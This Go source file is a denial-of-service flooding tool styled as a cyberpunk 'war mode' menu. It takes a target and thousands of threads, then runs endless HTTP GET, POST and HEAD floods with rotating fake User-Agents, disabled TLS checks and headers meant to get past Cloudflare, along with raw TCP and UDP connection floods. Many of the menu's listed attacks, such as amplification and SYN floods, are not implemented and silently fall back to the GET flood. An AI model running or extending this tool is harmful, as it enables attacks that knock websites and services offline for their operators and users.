package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

const (
	Version = "3.0.0-ULTIMATE-WAR-MODE"
	Author  = "El cienco"
	Theme   = "Japanese / Cyberpunk"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
		"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60",
		// ... (Daftar ini akan diperluas secara dinamis dalam memori untuk mencapai 1000+)
	}
)

func init() {
	// Menghasilkan 1000+ User-Agent secara dinamis untuk variasi maksimal
	platforms := []string{"Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64", "iPhone; CPU iPhone OS 17_1 like Mac OS X", "Android 14; Mobile"}
	browsers := []string{"Chrome", "Firefox", "Safari", "Edge", "Opera"}
	for i := 0; i < 990; i++ {
		p := platforms[rand.Intn(len(platforms))]
		b := browsers[rand.Intn(len(browsers))]
		v := rand.Intn(50) + 80
		ua := fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%d.0.0.0 Safari/537.36", p, b, v)
		userAgents = append(userAgents, ua)
	}
}

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func neofetch() {
	fmt.Println("\x1b[35m")
	fmt.Println("       _..._       ")
	fmt.Println("     .'     '.     \x1b[37m [ GOZEN - 悟前 ]\x1b[35m")
	fmt.Println("    /  _   _  \\    \x1b[37m OS: Termux / Android\x1b[35m")
	fmt.Println("    | (o) (o) |    \x1b[37m Kernel: 2310-CORE\x1b[35m")
	fmt.Println("    |   ' '   |    \x1b[37m Uptime: Eternal\x1b[35m")
	fmt.Println("    \\  '---'  /    \x1b[37m Shell: Go-Zen-Shell\x1b[35m")
	fmt.Println("     '._____.'     \x1b[37m Theme: Sakura-Cyber\x1b[35m")
	fmt.Println("\x1b[0m")
}

func printMenu() {
	fmt.Println("\x1b[31m=== [ GOZEN ULTIMATE WAR MENU - 戦争メニュー ] ===\x1b[0m")
	features := []string{
		"1.  HTTP-RAW (標準HTTP)", "2.  HTTP-SOC (ソケット)", "3.  TCP-FLOOD (TCPフラッド)",
		"4.  UDP-FLOOD (UDPフラッド)", "5.  CF-BYPASS (CF回避)", "6.  TLS-BOOST (TLS強化)",
		"7.  GET-FLOOD (GET攻撃)", "8.  POST-FLOOD (POST攻撃)", "9.  HEAD-FLOOD (HEAD攻撃)",
		"10. SLOW-LORIS (低速攻撃)", "11. XML-RPC (XML攻撃)", "12. SYN-FLOOD (SYNフラッド)",
		"13. ICMP-ECHO (ICMP攻撃)", "14. DNS-AMP (DNS増幅)", "15. NTP-AMP (NTP増幅)",
		"16. MEMCACHED (キャッシュ)", "17. BOTNET-SIM (ボットネット)", "18. PROXY-SCRAPE (プロキシ)",
		"19. AGENT-1000 (1000エージェント)", "20. SYSTEM-PURGE (システム消去)",
	}

	for i := 0; i < len(features); i += 2 {
		fmt.Printf("%-25s %-25s\n", features[i], features[i+1])
	}
	fmt.Println("\x1b[31m==================================================\x1b[0m")
}

func getAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

// L7 Attack Engine
func attackL7(target string, method string, bypass bool, wg *sync.WaitGroup) {
	defer wg.Done()
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns: 1000,
		IdleConnTimeout: 30 * time.Second,
	}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}

	for {
		req, err := http.NewRequest(method, target, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", getAgent())
		if bypass {
			req.Header.Set("Cache-Control", "no-cache")
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
			req.Header.Set("Accept-Language", "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Referer", "https://www.google.com/")
		}

		resp, err := client.Do(req)
		if err == nil {
			fmt.Printf("\x1b[32m[L7] %s -> %s | Status: %d\x1b[0m\n", method, target, resp.StatusCode)
			resp.Body.Close()
		} else {
			fmt.Printf("\x1b[31m[L7] Error: %v\x1b[0m\n", err)
		}
	}
}

// L4 Attack Engine
func attackL4(target string, protocol string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		conn, err := net.DialTimeout(protocol, target, 5*time.Second)
		if err == nil {
			if protocol == "tcp" {
				fmt.Printf("\x1b[34m[L4-TCP] Connected -> %s\x1b[0m\n", target)
				conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))
			} else {
				data := make([]byte, 1024)
				rand.Read(data)
				conn.Write(data)
				fmt.Printf("\x1b[36m[L4-UDP] Packet Sent -> %s\x1b[0m\n", target)
			}
			conn.Close()
		} else {
			fmt.Printf("\x1b[31m[L4] Error: %v\x1b[0m\n", err)
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	clearScreen()
	neofetch()
	printMenu()

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("\x1b[33m選択 (1-20): \x1b[0m")
	choiceStr, _ := reader.ReadString('\n')
	choiceStr = strings.TrimSpace(choiceStr)

	fmt.Print("\x1b[33mターゲット (URL/IP:Port): \x1b[0m")
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)

	fmt.Print("\x1b[33mスレッド数 (1-5000): \x1b[0m")
	var threads int
	fmt.Scan(&threads)

	if threads <= 0 { threads = 100 }

	fmt.Printf("\x1b[31m[!] GOZEN WAR MODE ACTIVATED: %s [%d THREADS]\x1b[0m\n", target, threads)
	time.Sleep(2 * time.Second)

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		switch choiceStr {
		case "1", "7": go attackL7(target, "GET", false, &wg)
		case "2": go attackL4(target, "tcp", &wg)
		case "3": go attackL4(target, "tcp", &wg)
		case "4": go attackL4(target, "udp", &wg)
		case "5": go attackL7(target, "GET", true, &wg)
		case "8": go attackL7(target, "POST", true, &wg)
		case "9": go attackL7(target, "HEAD", true, &wg)
		default: go attackL7(target, "GET", true, &wg)
		}
	}
	wg.Wait()
}
